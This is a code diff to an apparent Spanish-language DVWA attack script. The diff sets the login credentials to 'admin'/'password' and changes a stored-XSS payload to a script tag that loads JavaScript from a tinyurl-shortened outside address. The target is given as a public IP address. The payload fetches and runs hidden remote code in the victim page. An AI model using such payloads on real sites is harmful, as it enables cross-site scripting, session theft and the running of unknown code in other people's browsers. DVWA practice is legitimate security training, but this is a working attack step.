@@ -4,7 +4,6 @@ Requisitos:
   pip install requests beautifulsoup4
 Ajusta DVWA_BASE, USER y PASS según tu entorno.
 """
-
 import sys
 import re
 import random
@@ -16,8 +15,8 @@ from bs4 import BeautifulSoup
 DVWA_BASE = "http://74.179.81.132/dvwa"
 
 # Credenciales de usuario para DVWA
-USER = ""
-PASS = ""
+USER = "admin"
+PASS = "password"
 
 
 def get_token(html):
@@ -154,7 +153,7 @@ def main():
     # Crear identificador único y payload
     uniq = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
     marker = f"x{uniq}"
-    payload = '<script src=//tinyurl.com/fmujnr6b></script>'  # <= Máx. 50 caracteres
+    payload = '<script src=//tinyurl.com/46r37j3d></script>'  # <= Máx. 50 caracteres
 
     status, xss_url = inject_payload(session, marker, payload)
 
